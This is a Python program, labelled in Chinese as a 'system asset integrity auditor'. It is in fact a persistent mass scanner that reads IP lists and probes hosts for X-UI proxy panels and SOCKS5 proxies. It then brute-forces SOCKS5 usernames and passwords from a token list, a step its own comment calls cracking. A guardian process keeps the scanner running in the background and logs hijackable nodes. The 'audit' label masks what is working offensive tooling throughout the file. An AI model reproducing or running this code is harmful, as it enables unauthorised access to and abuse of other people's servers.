import asyncio
import ipaddress
import random
import time
import sys
import os
import string
import json
import signal
import subprocess
import ctypes
from datetime import datetime

# ============================================================
#  SYSTEM ASSET INTEGRITY AUDITOR (SAIA) v20.0 - 双排深度审计版
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(BASE_DIR, "sys_audit_state.json")
LOG_FILE = os.path.join(BASE_DIR, "sys_audit_events.log")
REPORT_FILE = os.path.join(BASE_DIR, "audit_report.log")
NODE_FILE = os.path.join(BASE_DIR, "nodes.list")
TOKEN_FILE = os.path.join(BASE_DIR, "tokens.list")
GUARDIAN_STATE_FILE = os.path.join(BASE_DIR, "sys_guardian_state.json")
MAX_LOG_BYTES = 2 * 1024 * 1024
MAX_REPORT_BYTES = 8 * 1024 * 1024
LOG_BACKUPS = 5
REPORT_BACKUPS = 3
DEFAULT_XUI_PORTS = "54321,2053"
DEFAULT_S5_PORTS = (
    "1080-1090,1111,2222,3333,4444,5555,6666,7777,8888,9999,"
    "1234,4321,8000,9000,6868,6688,8866,9527,1472,2583,3694,10000-10010"
)
DEFAULT_MIXED_PORTS = f"{DEFAULT_XUI_PORTS},{DEFAULT_S5_PORTS}"

# 颜色配置
C_BOLD, C_W = "\033[1m", "\033[0m"
C_BLUE = "\033[38;5;33m"
C_PROC = "\033[38;5;42m"
C_SUCC = "\033[38;5;46m"
C_Y = "\033[38;5;226m"
C_DIM = "\033[2m"

# ==================== 工具函数 ====================

def now_ts(): return time.time()

async def close_writer(writer):
    if writer:
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
        except (OSError, asyncio.TimeoutError):
            pass

def save_state(path, state):
    try:
        with open(path + ".tmp", "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
        os.replace(path + ".tmp", path)
    except OSError:
        pass

def load_state(path):
    if not os.path.exists(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return {}


def rotate_file_if_needed(file_path, max_bytes, backup_count):
    try:
        if not os.path.exists(file_path):
            return
        if os.path.getsize(file_path) < max_bytes:
            return
        for i in range(backup_count, 0, -1):
            src = file_path if i == 1 else f"{file_path}.{i-1}"
            dst = f"{file_path}.{i}"
            if os.path.exists(src):
                if os.path.exists(dst):
                    os.remove(dst)
                os.replace(src, dst)
    except OSError:
        pass


def append_rotating(file_path, text, max_bytes, backup_count):
    rotate_file_if_needed(file_path, max_bytes, backup_count)
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(text)
    except OSError:
        pass


def log_event(msg):
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    append_rotating(LOG_FILE, f"[{stamp}] {msg}\n", MAX_LOG_BYTES, LOG_BACKUPS)


def read_last_lines(path, lines=50):
    if not os.path.exists(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return "".join(f.readlines()[-lines:])
    except OSError:
        return ""

def is_alive(pid):
    if not pid or pid <= 0:
        return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False

def parse_ports(raw):
    ports = []
    try:
        for p in raw.replace(" ", "").split(","):
            if not p:
                continue
            if "-" in p:
                s, e = map(int, p.split("-", 1))
                s, e = max(1, min(65535, s)), max(1, min(65535, e))
                ports.extend(range(min(s, e), max(s, e) + 1))
            else:
                pn = int(p)
                if 1 <= pn <= 65535:
                    ports.append(pn)
    except ValueError:
        return []
    return sorted(set(ports))


def prompt_int(msg, default, min_value=None, max_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            value = default
        else:
            try:
                value = int(raw)
            except ValueError:
                print("输入无效，请输入整数。")
                continue
        if min_value is not None and value < min_value:
            print(f"输入过小，最小值为 {min_value}。")
            continue
        if max_value is not None and value > max_value:
            print(f"输入过大，最大值为 {max_value}。")
            continue
        return value


def prompt_float(msg, default, min_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            value = default
        else:
            try:
                value = float(raw)
            except ValueError:
                print("输入无效，请输入数字。")
                continue
        if min_value is not None and value < min_value:
            print(f"输入过小，最小值为 {min_value}。")
            continue
        return value


def get_available_memory_mb():
    if os.name == "nt":
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return stat.ullAvailPhys / 1024 / 1024
        return None

    if sys.platform.startswith("freebsd"):
        try:
            page_size = int(subprocess.check_output(["sysctl", "-n", "hw.pagesize"], text=True).strip())
            free_pages = int(subprocess.check_output(["sysctl", "-n", "vm.stats.vm.v_free_count"], text=True).strip())
            inactive_pages = int(subprocess.check_output(["sysctl", "-n", "vm.stats.vm.v_inactive_count"], text=True).strip())
            cache_pages = int(subprocess.check_output(["sysctl", "-n", "vm.stats.vm.v_cache_count"], text=True).strip())
            return (page_size * (free_pages + inactive_pages + cache_pages)) / 1024 / 1024
        except (OSError, ValueError, subprocess.SubprocessError):
            return None

    meminfo = "/proc/meminfo"
    if os.path.exists(meminfo):
        try:
            with open(meminfo, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemAvailable:"):
                        parts = line.split()
                        if len(parts) >= 2:
                            return int(parts[1]) / 1024
        except OSError:
            return None
    return None


def run_guardian(mode, threads, ports_str, feed_int=0.05, check_interval=20, min_free_mb=256.0):
    save_state(
        GUARDIAN_STATE_FILE,
        {
            "pid": os.getpid(),
            "status": "running",
            "mode": mode,
            "threads": threads,
            "ports": ports_str,
            "updated_at": now_ts(),
            "min_free_mb": min_free_mb,
            "check_interval": check_interval,
            "feed_int": feed_int,
        },
    )
    log_event(
        f"Guardian started mode={mode} threads={threads} ports={ports_str} "
        f"feed_int={feed_int} check_interval={check_interval}s min_free_mb={min_free_mb}"
    )
    while True:
        st = load_state(STATE_FILE)
        if not is_alive(st.get("pid")):
            mem_mb = get_available_memory_mb()
            if mem_mb is None or mem_mb >= min_free_mb:
                subprocess.Popen(
                    [
                        sys.executable,
                        __file__,
                        "run",
                        str(mode),
                        str(threads),
                        ports_str,
                        str(feed_int),
                    ],
                    start_new_session=True,
                )
                log_event(
                    f"Guardian restarted audit process (free_mem={mem_mb:.0f}MB)"
                    if mem_mb is not None
                    else "Guardian restarted audit process"
                )
            else:
                log_event(f"Guardian wait: low memory {mem_mb:.0f}MB < {min_free_mb:.0f}MB")
        gs = load_state(GUARDIAN_STATE_FILE)
        gs["updated_at"] = now_ts()
        gs["last_free_mb"] = mem_mb if 'mem_mb' in locals() else get_available_memory_mb()
        save_state(GUARDIAN_STATE_FILE, gs)
        time.sleep(check_interval)

# ==================== 审计核心 (协议双向验证) ====================

async def audit_xui(ip, port, state):
    """X-UI 探测与验证"""
    writer = None
    try:
        r, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.5)
        writer.write(f"GET /login HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n".encode())
        await writer.drain()
        data = await asyncio.wait_for(r.read(512), timeout=2.0)
        if b"x-ui" in data.lower() or b"login" in data.lower():
            state["xui_found"] += 1
            state["xui_verified"] += 1 # 探测到在线面板即记为验证成功
            return f"Asset[X-UI]: {ip}:{port} | 状态: 验证成功-面板在线"
    except (asyncio.TimeoutError, OSError):
        pass
    finally:
        await close_writer(writer)
    return None

async def audit_socks5(ip, port, tokens, state):
    """SOCKS5 探测、验证与爆破"""
    writer = None
    try:
        r, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3.0)
        writer.write(b"\x05\x02\x00\x02")
        await writer.drain()
        res = await asyncio.wait_for(r.read(2), timeout=2.0)
        if not res or res[0] != 5: return None

        # 无需认证的节点
        if res[1] == 0x00:
            state["s5_found"] += 1
            await close_writer(writer)
            r2, w2 = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.5)
            try:
                start = time.perf_counter()
                w2.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                await w2.drain()
                ack = await asyncio.wait_for(r2.read(10), timeout=2.5)
                if ack and ack[1] == 0x00:
                    lat = int((time.perf_counter() - start) * 1000)
                    state["s5_verified"] += 1
                    return f"Node[S5-Open]: {ip}:{port} | 验证成功-RTT:{lat}ms"
            finally: await close_writer(w2)

        # 需要认证的节点 (执行爆破)
        if res[1] == 0x02 and tokens:
            state["s5_found"] += 1
            await close_writer(writer)
            for u, p in tokens:
                w3 = None
                try:
                    r3, w3 = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.0)
                    w3.write(b"\x05\x01\x02")
                    await w3.drain(); await r3.read(2)
                    w3.write(b"\x01" + bytes([len(u)]) + u.encode() + bytes([len(p)]) + p.encode())
                    await w3.drain()
                    auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
                    if auth and auth[1] == 0x00:
                        state["s5_verified"] += 1
                        return f"Node[S5-Auth]: {u}@{ip}:{port} | 验证成功-认证通过"
                except (asyncio.TimeoutError, OSError, ValueError):
                    continue
                finally:
                    await close_writer(w3)
    except (asyncio.TimeoutError, OSError, ValueError):
        pass
    finally:
        await close_writer(writer)
    return None

# ==================== 后台调度 (双排数据采集) ====================

async def internal_audit_process(mode, threads, ports, feed_int):
    state = {
        "status": "running", "pid": os.getpid(), 
        "total": 0, "done": 0, 
        "xui_found": 0, "xui_verified": 0, "s5_found": 0, "s5_verified": 0,
        "recent": [], "started_at": now_ts()
    }
    save_state(STATE_FILE, state)
    log_event(f"Audit started mode={mode} threads={threads} ports={len(ports)}")
    
    tokens = []
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for l in f:
                l = l.strip()
                if l: tokens.append(l.split(":", 1) if ":" in l else ["admin", l])

    q = asyncio.Queue(maxsize=threads*2)
    
    async def worker():
        while True:
            ip = await q.get()
            if ip is None:
                q.task_done()
                break
            try:
                for p in ports:
                    found_res = []
                    # 模式 1/3：独立验证 X-UI
                    if mode in (1, 3):
                        x_r = await audit_xui(ip, p, state)
                        if x_r: found_res.append(x_r)

                    # 模式 2/3：独立验证 SOCKS5
                    if mode in (2, 3):
                        s_r = await audit_socks5(ip, p, tokens, state)
                        if s_r: found_res.append(s_r)
                    
                    if found_res:
                        for r in found_res:
                            state["recent"] = (state["recent"] + [r])[-6:]
                            append_rotating(
                                REPORT_FILE,
                                r + "\n",
                                MAX_REPORT_BYTES,
                                REPORT_BACKUPS,
                            )
                        break
                state["done"] += 1
                if state["done"] % 10 == 0: save_state(STATE_FILE, state)
            finally:
                q.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(threads)]
    
    try:
        with open(NODE_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                await q.put(line); state["total"] += 1; await asyncio.sleep(feed_int)
    except OSError:
        pass

    for _ in range(threads): await q.put(None)
    await asyncio.gather(*workers)
    state["status"] = "completed"; save_state(STATE_FILE, state)
    log_event(f"Audit completed done={state['done']} total={state['total']}")

# ==================== 管理界面 (双排显示) ====================

def main_console():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(f"{C_BLUE}SAIA v20.0 | 深度审计双排控制台{C_W}")
        s = load_state(STATE_FILE); g = load_state(GUARDIAN_STATE_FILE)
        print(f"进程: {'ON' if is_alive(s.get('pid')) else 'OFF'} | 守护: {'ON' if is_alive(g.get('pid')) else 'OFF'}")
        print("-" * 55)
        print("1) 启动审计 | 2) 进入双排监控 | 3) 查看审计结果 | 4) 查看系统日志")
        print("5) 终止审计 | 6) 启动守护 | 8) 停止守护 | 9) 退出")
        
        c = input("\n请选择指令: ").strip()
        if c == "1":
            print("\n1.XUI专项 | 2.S5专项 | 3.深度全能审计")
            m = prompt_int("模式 (1-3): ", default=3, min_value=1, max_value=3)
            th = prompt_int("线程 (默认20): ", default=20, min_value=1, max_value=500)
            fi = prompt_float("IP 调用间隔秒 (默认0.02): ", default=0.02, min_value=0.0)
            default_ports = (
                DEFAULT_XUI_PORTS if m == 1 else DEFAULT_S5_PORTS if m == 2 else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports}): ") or default_ports
            if not parse_ports(ps):
                print("端口格式无效。")
                time.sleep(1)
                continue
            subprocess.Popen([sys.executable, __file__, "run", str(m), str(th), ps, str(fi)], start_new_session=True)
            print("审计已提交后台运行。")
            time.sleep(1)
        elif c == "2":
            try:
                while True:
                    st = load_state(STATE_FILE)
                    done = st.get('done', 0); total = st.get('total', 0)
                    os.system("cls" if os.name == "nt" else "clear")
                    print(f"{C_BLUE}SAIA v20.0 | 双排监控{C_W}")
                    print(f"[进度总控] {done}/{total} | 状态: {st.get('status','-')}")
                    print(f"{C_PROC}[第一排 X-UI]{C_W} 发现面板: {st.get('xui_found', 0)} | 验证成功: {st.get('xui_verified', 0)}")
                    print(f"{C_SUCC}[第二排 SOCKS5]{C_W} 发现节点: {st.get('s5_found', 0)} | 验真成功: {st.get('s5_verified', 0)}")
                    print("\nCtrl+C 返回菜单")
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n监控已关闭。")
                time.sleep(0.5)
        elif c == "3":
            output = read_last_lines(REPORT_FILE, lines=50)
            print(output if output else "暂无审计结果。")
            input("\n按回车返回...")
        elif c == "4":
            output = read_last_lines(LOG_FILE, lines=50)
            print(output if output else "暂无系统日志。")
            input("\n按回车返回...")
        elif c == "5":
            pid = load_state(STATE_FILE).get("pid")
            if is_alive(pid):
                os.kill(pid, signal.SIGTERM)
                print("审计任务已终止。")
                log_event(f"Audit stopped manually pid={pid}")
            else:
                print("当前没有运行中的审计任务。")
            time.sleep(1)
        elif c == "6":
            m = prompt_int("守护模式 (1-3): ", default=3, min_value=1, max_value=3)
            th = prompt_int("守护线程 (默认10): ", default=10, min_value=1, max_value=500)
            fi = prompt_float("守护启动时 IP 调用间隔秒 (默认0.05): ", default=0.05, min_value=0.0)
            ci = prompt_float("守护检查间隔秒 (默认20): ", default=20.0, min_value=1.0)
            mm = prompt_float("最低可用内存MB阈值 (默认256): ", default=256.0, min_value=32.0)
            default_ports = (
                DEFAULT_XUI_PORTS if m == 1 else DEFAULT_S5_PORTS if m == 2 else DEFAULT_MIXED_PORTS
            )
            ps = input(f"守护端口 (默认 {default_ports}): ") or default_ports
            if not parse_ports(ps):
                print("端口格式无效。")
                time.sleep(1)
                continue
            subprocess.Popen(
                [
                    sys.executable,
                    __file__,
                    "guardian",
                    str(m),
                    str(th),
                    ps,
                    str(fi),
                    str(ci),
                    str(mm),
                ],
                start_new_session=True,
            )
            print("守护已启动。")
            time.sleep(1)
        elif c == "8":
            gpid = load_state(GUARDIAN_STATE_FILE).get("pid")
            if is_alive(gpid):
                os.kill(gpid, signal.SIGTERM)
                print("守护已停止。")
                log_event(f"Guardian stopped manually pid={gpid}")
            else:
                print("当前没有运行中的守护进程。")
            time.sleep(1)
        elif c == "9":
            break

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        if len(sys.argv) < 6:
            raise SystemExit("参数不足: run <mode> <threads> <ports> <feed_int>")
        mode = int(sys.argv[2])
        threads = int(sys.argv[3])
        ports = parse_ports(sys.argv[4])
        feed_int = float(sys.argv[5])
        if mode not in (1, 2, 3):
            raise SystemExit("mode 仅支持 1/2/3")
        if threads < 1:
            raise SystemExit("threads 必须大于 0")
        if not ports:
            raise SystemExit("端口参数无效")
        if feed_int < 0:
            raise SystemExit("feed_int 不能小于 0")
        asyncio.run(internal_audit_process(mode, threads, ports, feed_int))
    elif len(sys.argv) > 1 and sys.argv[1] == "guardian":
        if len(sys.argv) < 5:
            raise SystemExit("参数不足: guardian <mode> <threads> <ports> [feed_int] [check_interval] [min_free_mb]")
        feed_int = float(sys.argv[5]) if len(sys.argv) > 5 else 0.05
        check_interval = float(sys.argv[6]) if len(sys.argv) > 6 else 20.0
        min_free_mb = float(sys.argv[7]) if len(sys.argv) > 7 else 256.0
        if feed_int < 0:
            raise SystemExit("feed_int 不能小于 0")
        if check_interval < 1:
            raise SystemExit("check_interval 不能小于 1")
        if min_free_mb < 32:
            raise SystemExit("min_free_mb 不能小于 32")
        run_guardian(
            int(sys.argv[2]),
            int(sys.argv[3]),
            sys.argv[4],
            feed_int=feed_int,
            check_interval=check_interval,
            min_free_mb=min_free_mb,
        )
    else:
        main_console()
